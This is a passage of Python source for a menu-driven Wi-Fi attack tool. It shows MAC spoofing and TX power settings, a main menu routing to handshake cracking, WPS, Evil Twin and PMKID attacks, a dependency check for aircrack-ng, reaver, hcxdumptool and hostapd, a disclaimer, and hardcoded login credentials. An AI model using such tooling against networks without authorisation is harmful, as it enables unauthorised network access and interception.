        Write.Print("[2] MAC Address Spoofing\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[3] TX Power Control\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[4] Thread Configuration\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("[5] System Information\n\n", Colors.red_to_purple, interval=0.0001)
        
        choice = input(Colorate.Horizontal(Colors.red_to_purple, "Choice: "))
        
        if choice == "1":
            Write.Print("\nAvailable interfaces:\n", Colors.red_to_purple, interval=0.0001)
            for idx, iface in enumerate(self.core.net.interfaces, 1):
                status = "Monitor" if self.core.net.monitor_mode.get(iface) else "Managed"
                Write.Print(f"[{idx}] {iface} ({status})\n", Colors.red_to_purple, interval=0.0001)
            
            sel = input(Colorate.Horizontal(Colors.red_to_purple, "\nSelect interface: "))
            if sel.isdigit() and 1 <= int(sel) <= len(self.core.net.interfaces):
                new_iface = self.core.net.interfaces[int(sel) - 1]
                self.core.net.disable_monitor(self.core.current_iface)
                self.core.current_iface = new_iface
                self.core.init_iface()
                Write.Print(f"\nInterface changed to {new_iface}\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "2":
            current_mac = self.core.net.get_mac(self.core.current_iface)
            Write.Print(f"\nCurrent MAC: {current_mac}\n", Colors.red_to_purple, interval=0.0001)
            
            new_mac = input(Colorate.Horizontal(Colors.red_to_purple, "New MAC [random]: "))
            if not new_mac:
                new_mac = ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))
            
            self.core.net.set_mac(self.core.current_iface, new_mac)
            Write.Print(f"\nMAC changed to {new_mac}\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "3":
            current_power = self.core.net.get_txpower(self.core.current_iface)
            Write.Print(f"\nCurrent TX Power: {current_power} dBm\n", Colors.red_to_purple, interval=0.0001)
            
            new_power = input(Colorate.Horizontal(Colors.red_to_purple, "New TX Power (dBm) [20]: "))
            new_power = int(new_power) if new_power.isdigit() else 20
            
            self.core.net.set_txpower(self.core.current_iface, new_power)
            Write.Print(f"\nTX Power set to {new_power} dBm\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "4":
            threads = input(Colorate.Horizontal(Colors.red_to_purple, "Thread count [4-32]: "))
            if threads.isdigit() and 4 <= int(threads) <= 32:
                self.core.cracker = Cracker(threads=int(threads))
                Write.Print(f"\nThread count set to {threads}\n", Colors.green_to_cyan, interval=0.0001)
        
        elif choice == "5":
            Write.Print("\nSystem Information:\n\n", Colors.green_to_cyan, interval=0.0001)
            Write.Print(f"Platform: {platform.system()} {platform.release()}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Current Interface: {self.core.current_iface}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Monitor Mode: {'Enabled' if self.core.monitor_enabled else 'Disabled'}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Available Interfaces: {', '.join(self.core.net.interfaces)}\n", Colors.red_to_purple, interval=0.0001)
            Write.Print(f"Mode: {'Guest (View Only)' if self.guest_mode else 'Full Access'}\n", Colors.red_to_purple, interval=0.0001)
        
        time.sleep(2)
        input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))
    
    def run(self):
        self._auth()
        
        if not self.guest_mode:
            Write.Print("\nStarting wireless interface\n", Colors.red_to_purple, interval=0.0001)
            if not self.core.init_iface():
                Write.Print("\nFailed to initialize interface\n", Colors.red_to_purple, interval=0.0001)
                Write.Print("Ensure wireless adapter supports monitor mode\n", Colors.red_to_purple, interval=0.0001)
                sys.exit(1)
            
            Write.Print(f"Interface {self.core.current_iface} ready\n", Colors.green_to_cyan, interval=0.0001)
            time.sleep(2)
        else:
            Write.Print("\nGuest mode active - view only access\n", Colors.red_to_purple, interval=0.0001)
            time.sleep(2)
        
        while self.running:
            self._clear()
            self._banner()
            self._menu()
            
            choice = input(Colorate.Horizontal(Colors.red_to_purple, "Select option: "))
            
            if choice == "1":
                self._scan_ui()
            elif choice == "2":
                self._analysis_ui()
            elif choice == "3":
                self._attack_ui()
            elif choice == "4":
                self._wordlist_ui()
            elif choice == "5":
                self._wps_ui()
            elif choice == "6":
                self._evil_twin_ui()
            elif choice == "7":
                self._pmkid_ui()
            elif choice == "8":
                self._database_ui()
            elif choice == "9":
                self._settings_ui()
            elif choice == "0":
                Write.Print("\nShutting down\n", Colors.red_to_purple, interval=0.0001)
                self.running = False
            else:
                Write.Print("\nInvalid option\n", Colors.red_to_purple, interval=0.0001)
                time.sleep(1)
        
        if not self.guest_mode:
            self.core.cleanup()

def check_requirements():
    Write.Print("\nStatus:\n", Colors.blue_to_cyan, interval=0.0001)
    
    required_tools = {
        'airodump-ng': 'aircrack-ng suite',
        'aircrack-ng': 'aircrack-ng suite',
        'aireplay-ng': 'aircrack-ng suite',
        'iw': 'wireless tools',
        'ip': 'iproute2'
    }
    
    optional_tools = {
        'reaver': 'WPS attacks',
        'hcxdumptool': 'PMKID capture',
        'hcxpcapngtool': 'PMKID conversion',
        'hashcat': 'hash cracking',
        'hostapd': 'Evil Twin attacks',
        'dnsmasq': 'DHCP server'
    }
    
    missing_required = []
    missing_optional = []
    
    for tool, desc in required_tools.items():
        result = subprocess.run(['which', tool], capture_output=True)
        if result.returncode != 0:
            missing_required.append(f"{tool} ({desc})")
            Write.Print(f"[MISSING] {tool} - {desc}\n", Colors.red_to_purple, interval=0.0001)
        else:
            Write.Print(f"[OK] {tool}\n", Colors.green_to_cyan, interval=0.0001)
    
    Write.Print("\nOptional tools:\n", Colors.blue_to_cyan, interval=0.0001)
    for tool, desc in optional_tools.items():
        result = subprocess.run(['which', tool], capture_output=True)
        if result.returncode != 0:
            missing_optional.append(f"{tool} ({desc})")
            Write.Print(f"[MISSING] {tool} - {desc}\n", Colors.red_to_purple, interval=0.0001)
        else:
            Write.Print(f"[OK] {tool}\n", Colors.green_to_cyan, interval=0.0001)
    
    if missing_required:
        Write.Print("\n\nCRITICAL: Missing required tools\n", Colors.red_to_purple, interval=0.0001)
        Write.Print("Install with: sudo apt-get install aircrack-ng wireless-tools iproute2\n", Colors.red_to_purple, interval=0.0001)
        return False
    
    if missing_optional:
        Write.Print("\n\nWARNING: Some optional tools are missing\n", Colors.blue_to_cyan, interval=0.0001)
        Write.Print("Some features may not be available\n", Colors.blue_to_cyan, interval=0.0001)
    
    return True

def show_disclaimer():
    disclaimer = """
========================================
           LEGAL DISCLAIMER
========================================

This tool is for educational and authorized
security testing purposes ONLY.

Unauthorized access to computer networks is
illegal. Always obtain proper authorization
before testing any network.

The authors are not responsible for misuse
or damage caused by this tool.

By using this tool, you agree to use it
responsibly and legally.

========================================
"""
    Write.Print(disclaimer + "\n", Colors.red_to_purple, interval=0.0001)
    agree = input(Colorate.Horizontal(Colors.red_to_purple, "Do you agree? (yes/no): "))
    return agree.lower() == "yes"

def show_requirements():
    requirements = """
========================================
          Requirements !!!
========================================

Required:
- aircrack-ng (airodump-ng, aircrack-ng, aireplay-ng)
- wireless-tools (iw, iwconfig)
- iproute2 (ip command)
- reaver (for WPS attacks)
- hcxdumptool + hcxpcapngtool (for PMKID)
- hashcat (for advanced cracking)
- hostapd + dnsmasq (for Evil Twin)

Hardware:
- Wireless adapter with monitor mode support
- Chipsets: Atheros, Ralink, Realtek
- Recommended: Alfa AWUS036ACH, TP-Link TL-WN722N

Operating sys:
- Linux (Kali, Ubuntu, Debian)
- Root/sudo access required

Authentication (Free Version)
- Username: shsm
- Password: shsm00

========================================
"""
    Write.Print(requirements, Colors.red_to_purple, interval=0.0001)
    input(Colorate.Horizontal(Colors.red_to_purple, "\nPress Enter to continue"))

def main():
    try:
        if os.geteuid() != 0:
            Write.Print("This tool requires root privileges\n", Colors.red_to_purple, interval=0.0001)
            Write.Print("Please run with: sudo python3 xyz.py\n", Colors.red_to_purple, interval=0.0001)
            sys.exit(1)
    except AttributeError:
        Write.Print("This tool must be run on Linux\n", Colors.red_to_purple, interval=0.0001)
        sys.exit(1)
    
    os.system('clear')
    
    if not show_disclaimer():
        Write.Print("\nU must agree to the disclaimer.\n", Colors.red_to_purple, interval=0.0001)
        sys.exit(1)
    
    os.system('clear')
    show_requirements()
    os.system('clear')
    
    if not check_requirements():
        Write.Print("\nPlease install required tools before continuing\n", Colors.red_to_purple, interval=0.0001)
        sys.exit(1)
    
    input(Colorate.Horizontal(Colors.green_to_cyan, "\nU sure to continue? (enter)"))
    Write.Print("Starting application...\n\n", Colors.green_to_cyan, interval=0.0001)
    time.sleep(5)
    
    ui = UI()
    ui.run()

if __name__ == "__main__":
    main()